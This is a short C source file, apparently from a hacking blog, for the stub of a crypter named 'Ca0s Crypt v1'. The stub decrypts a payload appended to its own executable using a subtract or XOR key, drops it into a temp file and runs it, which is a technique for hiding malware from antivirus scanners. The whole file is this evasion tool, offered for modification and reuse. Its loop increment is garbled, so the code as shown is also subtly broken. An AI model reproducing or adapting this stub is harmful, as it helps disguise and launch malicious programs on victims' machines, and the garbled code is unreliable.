/*
    Stub para Ca0s Crypt v1
    If you modify source source, change MySize to new size in bytes
    [st4ck-3rr0r.blogspor.com]
*/
 
#include <sys/stat.h>
#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <process.h>
 
#define MySize 19856
 
FILE *mySelf, *tmpFile;
struct stat myStat;
char myName[MAX_PATH], tmpName[MAX_PATH];
int embedSize, x;
char *myByte, *modeByte, *cByte;
 
int main()
{
    GetModuleFileName(NULL, myName, sizeof(myName));
    stat(myName, &myStat);
    embedSize=myStat.st_size-MySize;
    mySelf=fopen(myName, "rb");
    lseek(fileno(mySelf), MySize, SEEK_SET);
    tmpnam(tmpName);
    tmpFile=fopen(tmpName, "wb");
    myByte=(char *)malloc(1);
    modeByte=(char *)malloc(1);
    cByte=(char *)malloc(1);
    fread(modeByte, 1, 1, mySelf); /// Crypt mode
    fread(cByte, 1, 1, mySelf);     // Crypt byte
    for(x=0; x<embedSize; x  )
    {
        fread(myByte, 1, 1, mySelf);
        if(*modeByte==0x01)
            *myByte-=*cByte;
        if(*modeByte==0x02)
            *myByte^=*cByte;
        fwrite(myByte, 1, 1, tmpFile);
    }
    fclose(mySelf);
    fclose(tmpFile);
    char *execPath[2];
    execPath[0]=tmpName;
    execPath[1]=NULL;
    execve(execPath[0], execPath, NULL);
   
    return 0;
}